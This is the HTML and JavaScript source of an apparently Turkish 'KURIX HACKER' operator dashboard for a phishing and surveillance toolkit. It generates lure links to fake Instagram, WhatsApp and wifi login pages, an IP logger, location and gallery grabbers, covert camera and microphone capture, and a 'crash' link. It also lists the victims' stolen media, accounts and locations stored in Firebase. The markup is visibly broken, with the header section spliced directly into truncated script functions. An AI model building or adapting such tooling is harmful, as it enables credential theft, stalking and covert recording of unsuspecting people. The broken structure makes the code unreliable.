<!DOCTYPE html>
<html lang="tr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>⛧ KURIX HACKER ⛧</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap');

        :root {
            --bg: #06080f;
            --bg2: #0a0d18;
            --bg3: #0e1120;
            --bg4: #111528;
            --border: #1a2040;
            --green: #00e676;
            --green2: #00c853;
            --glow: #00ff41;
            --green-glow: rgba(0, 255, 65, 0.5);
            --red: #ff1744;
            --red2: #d50000;
            --red-glow: rgba(255, 23, 68, 0.5);
            --orange: #ff9100;
            --cyan: #00e5ff;
            --cyan2: #00b8d4;
            --text: #d0d5e0;
            --muted: #5a6070;
            --radius-sm: 12px;
            --radius: 16px;
            --radius-lg: 22px;
            --shadow: 0 4px 24px rgba(0,0,0,0.5);
            --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: var(--bg);
            font-family: 'Fira Code', 'Courier New', monospace;
            padding: 12px;
            min-height: 100vh;
            color: var(--text);
            display: flex;
            justify-content: center;
            position: relative;
            overflow-x: hidden;
        }

        /* ============ ARKAPLAN EFEKTLERİ ============ */
        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            opacity: 0.35;
        }
        .bg-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            background-image:
                linear-gradient(rgba(0, 255, 65, 0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.02) 1px, transparent 1px);
            background-size: 40px 40px;
            animation: gridMove 20s linear infinite;
        }
        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(40px, 40px); }
        }
        .glow-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(130px);
            pointer-events: none;
            z-index: 0;
            animation: orbFloat 8s ease-in-out infinite;
        }
        .glow-orb.green {
            width: 450px;
            height: 450px;
            background: rgba(0, 255, 65, 0.035);
            top: -180px;
            right: -180px;
            animation-delay: 0s;
        }
        .glow-orb.red {
            width: 400px;
            height: 400px;
            background: rgba(255, 0, 64, 0.025);
            bottom: -150px;
            left: -150px;
            animation-delay: 4s;
        }
        @keyframes orbFloat {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(40px, -40px) scale(1.1); }
            50% { transform: translate(-30px, 30px) scale(0.9); }
            75% { transform: translate(-40px, -20px) scale(1.05); }
        }
        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(0, 0, 0, 0.1) 2px,
                rgba(0, 0, 0, 0.1) 4px
            );
            z-index: 1;
            pointer-events: none;
        }
        .particle {
            position: fixed;
            border-radius: 50%;
            pointer-events: none;
            z-index: 0;
            animation: floatUp linear infinite;
            opacity: 0;
        }
        @keyframes floatUp {
            0% { transform: translateY(110vh) scale(0); opacity: 0; }
            5% { opacity: 0.7; }
            90% { opacity: 0.5; }
            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
        }

        .container {
            width: 100%;
            max-width: 680px;
            display: flex;
            flex-direction: column;
            gap: 12px;
            position: relative;
            z-index: 10;
        }

        /* ============ HEADER ============ */
        .header {
            background: rgba(10, 13, 24, 0.9);
            border: 1px solid var(--border);
            border-radius: var(--radius-lg);
            padding: 14px 18px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            box-shadow: var(--shadow);
            position: sticky;
            top: 12px;
            z-index: 100;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        .logo-area { display: flex; align-items: center; gap: 8px; }
        .logo-symbol {
            font-size: 1.6rem;
            animation: logoPulse 2s infinite;
            color: var(--red);
        }
        @keyframes logoPulse {
            0%,100% { text-shadow: 0 0 8px rgba(255,23,68,0.6); }
            50% { text-shadow: 0 0 22px rgba(255,23,68,0.9); }
        }
        .logo-text {
            font-family: 'Orbitron', sans-serif;
            color: var(--glow);
            font-size: 1.1rem;
            font-weight: 800;
            letter-spacing: 1.5px;
            text-shadow: 0 0 14px rgba(0,255,65,0.3);
        }
        .logo-text .red { color: var(--red); }
        .header-right { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
        .status-badge {
            background: rgba(0,230,118,0.07);
            border: 1px solid rgba(0,230,118,0.25);
            padding: 5px 12px;
            border-radius: 18px;
            font-size: 0.58rem;
            color: var(--green);
            font-weight: 700;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            white-space: nowrap;
        }
        .flag-btn {
            background: var(--bg3);
            border: 2px solid var(--border);
            padding: 6px 10px;
            border-radius: 14px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: var(--transition);
            line-height: 1;
            color: var(--muted);
            font-weight: 600;
        }
        .flag-btn:hover { border-color: var(--green); color: var(--green); transform: scale(1.05); }
        .flag-btn.active { border-color: var(--green); background: rgba(0,230,118,0.1); box-shadow: 0 0 14px rgba(0,230,118,0.15); color: var(--green); }
        .btn-logout {
            background: var(--red);
            border: none;
            color: #fff;
            padding: 6px 14px;
            border-radius: 18px;
            cursor: pointer;
            font-weight: 700;
            font-size: 0.6rem;
            letter-spacing: 0.5px;
            transition: var(--transition);
            font-family: inherit;
            white-space: nowrap;
        }
        .btn-logout:hover { background: var(--red2); transform: translateY(-1px); box-shadow: 0 0 20px var(--red-glow); }

        /* ============ STATS ============ */
        .stats-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .stat-card {
            background: rgba(10, 13, 24, 0.9);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 16px;
            text-align: center;
            box-shadow: var(--shadow);
            transition: var(--transition);
            backdrop-filter: blur(10px);
        }
        .stat-card:hover { border-color: var(--green); transform: translateY(-2px); box-shadow: 0 0 25px rgba(0,230,118,0.1); }
        .stat-icon { font-size: 1.5rem; margin-bottom: 4px; }
        .stat-label { color: var(--muted); font-size: 0.55rem; letter-spacing: 1.5px; text-transform: uppercase; font-weight: 600; margin: 4px 0; }
        .stat-value { color: var(--glow); font-size: 1.6rem; font-weight: 800; text-shadow: 0 0 10px rgba(0,255,65,0.3); }

        /* ============ PANEL ============ */
        .panel {
            background: rgba(10, 13, 24, 0.9);
            border: 1px solid var(--border);
            border-radius: var(--radius-lg);
            padding: 18px;
            box-shadow: var(--shadow);
            transition: var(--transition);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        .panel-header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 14px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border);
        }
        .panel-icon { font-size: 1.2rem; }
        .panel-title { color: var(--glow); font-size: 0.82rem; font-weight: 700; letter-spacing: 0.5px; flex: 1; }
        .panel-badge {
            font-size: 0.52rem;
            background: rgba(255,23,68,0.1);
            color: var(--red);
            padding: 3px 10px;
            border-radius: 12px;
            font-weight: 700;
            letter-spacing: 0.5px;
            white-space: nowrap;
        }
        .panel-badge.cyan { background: rgba(0,229,255,0.1); color: var(--cyan); }
        .panel-badge.orange { background: rgba(255,145,0,0.1); color: var(--orange); }
        .panel-badge.purple { background: rgba(170,0,255,0.1); color: #aa00ff; }

        /* SLIDER */
        .slider-group {
            display: flex;
            align-items: center;
            gap: 10px;
            background: var(--bg3);
            padding: 10px 14px;
            border-radius: 26px;
            margin-bottom: 12px;
            flex-wrap: wrap;
            border: 1px solid var(--border);
        }
        .slider-label {
            color: var(--green);
            font-size: 0.62rem;
            font-weight: 600;
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 4px;
            min-width: 60px;
        }
        .slider-input {
            flex: 1;
            min-width: 80px;
            accent-color: var(--green);
            height: 5px;
            cursor: pointer;
        }
        .slider-value {
            background: rgba(0,230,118,0.12);
            color: var(--glow);
            padding: 5px 12px;
            border-radius: 16px;
            font-weight: 700;
            font-size: 0.62rem;
            white-space: nowrap;
            min-width: 50px;
            text-align: center;
        }

        /* GALLERY COUNT INPUT */
        .gallery-count-group {
            display: flex;
            align-items: center;
            gap: 10px;
            background: var(--bg3);
            padding: 10px 14px;
            border-radius: 26px;
            margin-bottom: 12px;
            flex-wrap: wrap;
            border: 1px solid var(--border);
        }
        .gallery-count-group label {
            color: #aa00ff;
            font-size: 0.62rem;
            font-weight: 600;
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 4px;
            min-width: 70px;
        }
        .gallery-count-input {
            flex: 1;
            min-width: 60px;
            background: var(--input-bg, rgba(10,12,24,0.95));
            border: 1px solid var(--border);
            color: var(--text);
            padding: 8px 12px;
            border-radius: 16px;
            font-family: 'Fira Code', monospace;
            font-size: 0.7rem;
            outline: none;
            text-align: center;
            transition: var(--transition);
        }
        .gallery-count-input:focus {
            border-color: #aa00ff;
            box-shadow: 0 0 15px rgba(170,0,255,0.15);
        }

        /* BUTTONS */
        .btn-row { display: flex; gap: 6px; flex-wrap: wrap; }
        .btn {
            padding: 9px 13px;
            border-radius: 22px;
            border: 1.5px solid var(--green);
            background: transparent;
            color: var(--glow);
            cursor: pointer;
            font-size: 0.64rem;
            font-weight: 700;
            transition: var(--transition);
            white-space: nowrap;
            font-family: inherit;
            letter-spacing: 0.3px;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .btn:hover { background: var(--green); color: #000; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,230,118,0.3); }
        .btn:active { transform: scale(0.96); }
        .btn.insta { border-color: var(--red); color: var(--red); }
        .btn.insta:hover { background: var(--red); color: #fff; box-shadow: 0 6px 20px rgba(255,23,68,0.3); }
        .btn.hack { border-color: var(--orange); color: var(--orange); }
        .btn.hack:hover { background: var(--orange); color: #000; box-shadow: 0 6px 20px rgba(255,145,0,0.3); }
        .btn.cyan { border-color: var(--cyan); color: var(--cyan); }
        .btn.cyan:hover { background: var(--cyan); color: #000; box-shadow: 0 6px 20px rgba(0,229,255,0.3); }
        .btn.gallery-btn { border-color: #aa00ff; color: #aa00ff; }
        .btn.gallery-btn:hover { background: #aa00ff; color: #fff; box-shadow: 0 6px 20px rgba(170,0,255,0.3); }
        .btn.danger { border-color: var(--red); color: var(--red); background: rgba(255,23,68,0.05); }
        .btn.danger:hover { background: var(--red); color: #fff; box-shadow: 0 6px 20px rgba(255,23,68,0.3); }
        .btn.crash {
            border-color: #ff0000;
            color: #ff0000;
            animation: crashPulse 1.8s infinite;
        }
        .btn.crash:hover { background: #ff0000; color: #fff; box-shadow: 0 6px 24px rgba(255,0,0,0.5); }
        @keyframes crashPulse {
            0%,100% { box-shadow: 0 0 0 rgba(255,0,0,0); }
            50% { box-shadow: 0 0 18px rgba(255,0,0,0.5); }
        }

        /* OUTPUT */
        .output-box {
            background: var(--bg3);
            border: 1px dashed rgba(0,230,118,0.2);
            border-radius: var(--radius-sm);
            padding: 12px;
            font-size: 0.58rem;
            word-break: break-all;
            margin-top: 10px;
            line-height: 1.7;
        }
        .output-box a { color: var(--glow); font-weight: 600; }
        .output-box a.crash-link { color: #ff0000; font-weight: 800; }
        .output-box a.cyan-link { color: var(--cyan); font-weight: 600; }
        .output-box a.gallery-link { color: #aa00ff; font-weight: 600; }
        .btn-copy {
            background: var(--green);
            border: none;
            padding: 4px 10px;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 700;
            font-size: 0.52rem;
            color: #000;
            font-family: inherit;
            transition: var(--transition);
        }
        .btn-copy:hover { background: var(--green2); transform: scale(1.05); }
        .output-note { font-size: 0.5rem; margin-top: 4px; display: block; }
        .output-note.red { color: #ff0000; }
        .output-note.cyan { color: var(--cyan); }
        .output-note.purple { color: #aa00ff; }

        /* ============ CARDS ============ */
        .media-card {
            background: var(--bg3);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            margin-bottom: 8px;
            overflow: hidden;
            transition: var(--transition);
        }
        .media-card:hover { border-color: var(--green); box-shadow: 0 0 15px rgba(0,230,118,0.08); }
        .media-card-header {
            padding: 10px 14px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 4px;
            background: var(--bg4);
        }
        .media-card-ip { color: var(--green); font-size: 0.56rem; font-weight: 700; }
        .media-card-time { color: var(--muted); font-size: 0.5rem; }
        .media-strip { display: flex; overflow-x: auto; gap: 8px; padding: 12px; }
        .media-strip img, .media-strip video {
            width: 70px;
            height: 70px;
            object-fit: cover;
            border: 2px solid var(--green);
            border-radius: 10px;
            cursor: pointer;
            flex-shrink: 0;
            transition: var(--transition);
        }
        .media-strip img:hover, .media-strip video:hover { transform: scale(1.08); border-color: var(--glow); box-shadow: 0 0 14px rgba(0,255,65,0.3); }
        .media-card-footer {
            padding: 10px 14px;
            border-top: 1px solid var(--border);
            display: flex;
            justify-content: flex-end;
            gap: 6px;
            flex-wrap: wrap;
        }
        .btn-download {
            background: var(--green);
            color: #000;
            border: none;
            padding: 5px 12px;
            border-radius: 14px;
            cursor: pointer;
            font-weight: 700;
            font-size: 0.55rem;
            font-family: inherit;
            transition: var(--transition);
        }
        .btn-download:hover { background: var(--green2); transform: scale(1.03); }
        .btn-delete {
            background: var(--red);
            color: #fff;
            border: none;
            padding: 5px 12px;
            border-radius: 14px;
            cursor: pointer;
            font-weight: 700;
            font-size: 0.55rem;
            font-family: inherit;
            transition: var(--transition);
        }
        .btn-delete:hover { background: var(--red2); transform: scale(1.03); }

        /* LOCATION CARDS */
        .loc-card {
            background: var(--bg3);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 14px;
            margin-bottom: 6px;
            transition: var(--transition);
        }
        .loc-card:hover { border-color: var(--cyan); }
        .loc-header { display: flex; justify-content: space-between; align-items: flex-start; gap: 6px; margin-bottom: 6px; }
        .loc-coords { color: var(--cyan); font-size: 0.66rem; font-weight: 700; }
        .loc-time { color: var(--muted); font-size: 0.5rem; white-space: nowrap; }
        .loc-address { color: var(--text); font-size: 0.56rem; margin-bottom: 6px; line-height: 1.5; }
        .loc-details { font-size: 0.5rem; color: var(--muted); margin-bottom: 8px; display: flex; gap: 10px; flex-wrap: wrap; }
        .loc-details span { color: var(--text); font-weight: 700; }
        .btn-maps {
            display: inline-block;
            background: var(--cyan);
            color: #000;
            padding: 6px 14px;
            border-radius: 16px;
            font-size: 0.56rem;
            font-weight: 700;
            text-decoration: none;
            transition: var(--transition);
        }
        .btn-maps:hover { background: var(--cyan2); transform: scale(1.03); }

        /* ACCOUNT / WIFI / GALLERY CARDS */
        .acc-card, .wifi-card, .gallery-card {
            background: var(--bg3);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            padding: 12px;
            margin-bottom: 5px;
            transition: var(--transition);
        }
        .acc-card:hover { border-color: var(--red); }
        .wifi-card:hover { border-color: var(--orange); }
        .gallery-card:hover { border-color: #aa00ff; }
        .acc-header, .wifi-header, .gallery-header { display: flex; justify-content: space-between; align-items: center; gap: 4px; margin-bottom: 5px; }
        .acc-user { color: var(--green); font-size: 0.7rem; font-weight: 700; }
        .wifi-ssid { color: var(--orange); font-size: 0.66rem; font-weight: 700; }
        .gallery-ip { color: #aa00ff; font-size: 0.66rem; font-weight: 700; }
        .acc-time, .wifi-time, .gallery-time { color: var(--muted); font-size: 0.5rem; }
        .acc-row, .wifi-row, .gallery-row { color: var(--muted); font-size: 0.54rem; margin-top: 2px; }
        .acc-row span, .wifi-row span, .gallery-row span { color: var(--text); font-weight: 700; }

        /* LOADING / EMPTY */
        .loading-text { text-align: center; color: var(--green); padding: 24px; font-size: 0.7rem; }
        .empty-text { text-align: center; color: var(--red); padding: 24px; font-size: 0.65rem; }
        .error-text { text-align: center; color: #ff0000; padding: 24px; font-size: 0.65rem; }
        .empty-desc { color: var(--muted); font-size: 0.5rem; margin-top: 4px; display: block; }

        /* MODAL */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.96);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            padding: 20px;
        }
        .modal-overlay img, .modal-overlay video {
            max-width: 94%;
            max-height: 90%;
            border: 2px solid var(--green);
            border-radius: var(--radius);
            box-shadow: 0 0 40px rgba(0,230,118,0.2);
        }
        .modal-close {
            position: absolute;
            top: 16px;
            right: 20px;
            color: var(--glow);
            font-size: 30px;
            cursor: pointer;
            z-index: 2001;
            background: rgba(0,0,0,0.6);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: var(--transition);
        }
        .modal-close:hover { background: var(--red); color: #fff; }
        .modal-download-btn {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--green);
            color: #000;
            border: none;
            padding: 8px 20px;
            border-radius: 20px;
            font-weight: 700;
            font-size: 0.65rem;
            cursor: pointer;
            z-index: 2001;
            font-family: inherit;
            transition: var(--transition);
        }
        .modal-download-btn:hover { background: var(--green2); transform: translateX(-50%) scale(1.05); }

        /* RTL */
        body.rtl { direction: rtl; text-align: right; }
        body.rtl .modal-close { right: auto; left: 20px; }
        body.rtl .panel-header { flex-direction: row-reverse; }
        body.rtl .header { flex-direction: row-reverse; }
        body.rtl .slider-group { flex-direction: row-reverse; }
        body.rtl .gallery-count-group { flex-direction: row-reverse; }

        /* SCROLLBAR */
        ::-webkit-scrollbar { height: 3px; width: 3px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--green); border-radius: 10px; }

        @media (max-width: 400px) {
            .btn { padding: 7px 10px; font-size: 0.58rem; }
            .media-strip img, .media-strip video { width: 55px; height: 55px; }
        }
    </style>
</head>
<body>

    <!-- ARKAPLAN EFEKTLERİ -->
    <div class="glow-orb green"></div>
    <div class="glow-orb red"></div>
    <div class="bg-grid"></div>
    <canvas id="matrixCanvas"></canvas>
    <div class="scanlines"></div>

    <div class="container">
        <!-- HEADER -->
        <div class="header">

        async function loadCaptures() {
            if (!user) return;
            const div = document.getElementById('capturesList');
            div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;
            try {
                const snap = await getDocs(query(collection(db, "captures"), where("userId", "==", user.uid)));
                let data = []; let tm = 0;
                snap.forEach(d => { const x = d.data(); data.push({ id: d.id, ...x }); tm += (x.media?.length || 0); });
                data.sort((a, b) => (b.unix || 0) - (a.unix || 0));
                document.getElementById('captureCount').innerText = data.length;
                document.getElementById('mediaCount').innerText = tm;
                if (!data.length) { div.innerHTML = `<div class="empty-text"><i class="fa-solid fa-circle-exclamation"></i> ${t('noData')}</div>`; return; }
                let h = '';
                for (let it of data) {
                    const date = new Date(it.timestamp);
                    let mode = ''; switch(it.mode) { case 'photo': mode = t('photo'); break; case '5photos': mode = t('photos'); break; case 'videoonly': mode = t('video'); break; case 'audio': mode = t('audio'); break; case 'videoaudio': mode = t('va'); break; default: mode = it.mode; }
                    let mh = '';
                    for (let m of it.media || []) {
                        const iv = m.match(/\.(mp4|webm|mov)/i);
                        if (iv) mh += `<video src="${m}" onclick="openMedia('${m}',true)"></video>`;
                        else mh += `<img src="${m}" onclick="openMedia('${m}',false)">`;
                    }
                    h += `<div class="media-card">
                        <div class="media-card-header"><span class="media-card-ip"><i class="fa-solid fa-globe"></i> IP: ${it.ip || t('unknown')}</span><span class="media-card-time"><i class="fa-solid fa-skull"></i> ${date.toLocaleString(lang==='ar'?'ar-SA':'tr-TR')} | ${mode} ${it.duration?'('+it.duration+t('secShort')+')':''}</span></div>
                        <div class="media-strip">${mh}</div>
                        <div class="media-card-footer">
                            <button class="btn-download" onclick="downloadAllMedia(${JSON.stringify(it.media||[]).replace(/"/g,'&quot;')})"><i class="fa-solid fa-download"></i> ${t('dlAll')}</button>
                            <button class="btn-delete" onclick="delCapture('${it.id}')"><i class="fa-solid fa-trash"></i> ${t('del')}</button>
                        </div></div>`;

        async function loadAccounts() {
            if (!user) return;
            const div = document.getElementById('accountsList');
            div.innerHTML = `<div class="loading-text"><i class="fa-solid fa-spinner fa-spin"></i> ${t('loading')}</div>`;

        // ============ SİLME ============
        async function clearColl(coll, field, val, confirmMsg, reloadFn) {
            if (!user || !confirm(confirmMsg)) return;
            const snap = await getDocs(query(collection(db, coll), where(field, "==", val)));
            await Promise.all([...snap.docs].map(d => deleteDoc(doc(db, coll, d.id))));
            await reloadFn();
        }

        window.delCapture = async (id) => { if (!confirm(t('cDel'))) return; await deleteDoc(doc(db, "captures", id)); await loadCaptures(); };

        window.downloadAllMedia = async (urls) => {
            for (let u of urls) {
                const a = document.createElement('a');
                a.href = u;
                a.download = u.split('/').pop()?.split('?')[0] || 'media';
                a.target = '_blank';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                await new Promise(r => setTimeout(r, 300));
            }
        };

        window.openMedia = (url, isVideo) => {
            currentModalUrl = url;
            const modal = document.getElementById('modal');
            const content = document.getElementById('modalContent');
            const dlBtn = document.getElementById('modalDownloadBtn');

            if (isVideo) content.innerHTML = `<video src="${url}" controls autoplay style="max-width:94%;max-height:88%;border-radius:14px;"></video>`;
            else content.innerHTML = `<img src="${url}" style="max-width:94%;max-height:88%;border-radius:14px;cursor:default;">`;

            dlBtn.style.display = 'block';
            dlBtn.onclick = () => {
                const a = document.createElement('a');
                a.href = currentModalUrl;
                a.download = currentModalUrl.split('/').pop()?.split('?')[0] || 'download';
                a.target = '_blank';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            };

            modal.style.display = 'flex';
        };

        function closeModal() {
            document.getElementById('modal').style.display = 'none';
            document.getElementById('modalContent').innerHTML = '';
            document.getElementById('modalDownloadBtn').style.display = 'none';
            currentModalUrl = null;
        }

        document.getElementById('modal').addEventListener('click', function(e) {
            if (e.target === this) closeModal();
        });
        document.getElementById('modalClose').addEventListener('click', closeModal);

        // ============ LİNK OLUŞTURMA ============
        function genLink(mode, isIg = false) {
            if (!user) return;
            let url = `${BASE}/?mode=${mode}&uid=${user.uid}`;
            if (['videoonly','videoaudio','audio'].includes(mode)) {
                url += `&duration=${isIg ? document.getElementById('igVideoDuration').value : document.getElementById('videoDuration').value}`;
            }
            if (isIg) url += '&force_chrome=1';
            const div = isIg ? document.getElementById('outputInsta') : document.getElementById('outputCamera');
            div.innerHTML = `<i class="fa-solid fa-link"></i> ${t('linkLabel')}: <a href="${url}" target="_blank">${url}</a> <button class="btn-copy" onclick="navigator.clipboard.writeText('${url}')"><i class="fa-solid fa-copy"></i> ${t('copy')}</button>`;
            if (isIg) div.innerHTML += `<span class="output-note red"><i class="fa-solid fa-circle-info"></i> ${t('instaNote')}</span>`;
        }

        function genHack(type) {
            if (!user) return;
            let url = '', note = '', cls = '';
            switch(type) {
                case 'ip': url = `${BASE}/hack/iplogger.html?uid=${user.uid}&redirect=https://google.com`; break;
                case 'wa': url = `${BASE}/hack/fakewhatsapp.html?uid=${user.uid}`; break;
                case 'wifi': url = `${BASE}/hack/fake_wifi.html?uid=${user.uid}`; note = t('wifiNote'); cls = 'cyan-link'; break;
                case 'ig': url = `${BASE}/hack/instagram_login.html?uid=${user.uid}`; break;
                case 'loc': url = `${BASE}/?mode=location&uid=${user.uid}`; note = t('locNote'); cls = 'cyan-link'; break;
                case 'gallery':
                    const count = document.getElementById('galleryCount').value || 10;
                    url = `${BASE}/hack/gallery.html?uid=${user.uid}&count=${count}`;
                    note = t('galleryNote') + ` (${count} foto)`;
                    cls = 'gallery-link';
                    break;
                case 'crash': url = `${BASE}/?crash=1`; note = t('crashWarn'); cls = 'crash-link'; break;
            }
            document.getElementById('outputHack').innerHTML = `<i class="fa-solid fa-link"></i> ${t('linkLabel')}: <a href="${url}" target="_blank" class="${cls}">${url}</a> <button class="btn-copy" onclick="navigator.clipboard.writeText('${url}')"><i class="fa-solid fa-copy"></i> ${t('copy')}</button>${note?`<span class="output-note ${type==='crash'?'red':type==='gallery'?'purple':'cyan'}"><i class="fa-solid fa-circle-info"></i> ${note}</span>`:''}`;
        }

        document.getElementById('btnIgPhoto').onclick = () => genLink('photo', true);

        document.getElementById('btnRefreshAll').onclick = () => { loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); loadGallery(); };
        document.getElementById('btnClearAll').onclick = () => clearColl('captures', 'userId', user?.uid, t('cClearAll'), loadCaptures);
        document.getElementById('logoutBtn').onclick = async () => { await signOut(auth); location.href = 'login.html'; };

        onAuthStateChanged(auth, (u) => {
            if (u) { user = u; applyLang(); loadCaptures(); loadAccounts(); loadLocations(); loadWifi(); loadGallery(); }
            else location.href = 'login.html';
        });

        // ============ MATRIX ANİMASYONU ============
        function initMatrix() {
            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');
            function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
            resize();
            window.addEventListener('resize', resize);
            const chars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜｦﾝ0123456789';
            const charArray = chars.split('');
            const fontSize = 13;
            const columns = Math.floor(canvas.width / fontSize);
            const drops = [];
            for (let i = 0; i < columns; i++) drops[i] = Math.floor(Math.random() * -canvas.height / fontSize);
            function draw() {
                ctx.fillStyle = 'rgba(6, 8, 15, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                for (let i = 0; i < drops.length; i++) {
                    const text = charArray[Math.floor(Math.random() * charArray.length)];
                    const x = i * fontSize;
                    const y = drops[i] * fontSize;
                    ctx.fillStyle = `rgba(0, 255, 65, ${Math.random() * 0.4 + 0.2})`;
                    ctx.font = fontSize + 'px "Fira Code", monospace';
                    ctx.fillText(text, x, y);
                    if (y > canvas.height && Math.random() > 0.97) drops[i] = 0;
                    drops[i]++;
                }
            }
            setInterval(draw, 45);
        }

        function initParticles() {
            const colors = ['#00ff41', '#00cc33', '#ff0040', '#ff3366', '#ffffff', '#aa00ff'];
            for (let i = 0; i < 20; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                const size = Math.random() * 2.2 + 0.6;
                particle.style.width = size + 'px';
                particle.style.height = size + 'px';
                particle.style.background = colors[Math.floor(Math.random() * colors.length)];
                particle.style.left = Math.random() * 100 + '%';
                particle.style.bottom = '0';
                particle.style.animationDuration = Math.random() * 18 + 10 + 's';
                particle.style.animationDelay = Math.random() * 15 + 's';
                particle.style.boxShadow = `0 0 ${size * 4}px ${particle.style.background}`;
                document.body.appendChild(particle);
                particle.addEventListener('animationiteration', () => {
                    particle.style.left = Math.random() * 100 + '%';
                    particle.style.animationDuration = Math.random() * 18 + 10 + 's';
                });
            }
        }

        initMatrix();
        initParticles();
    </script>
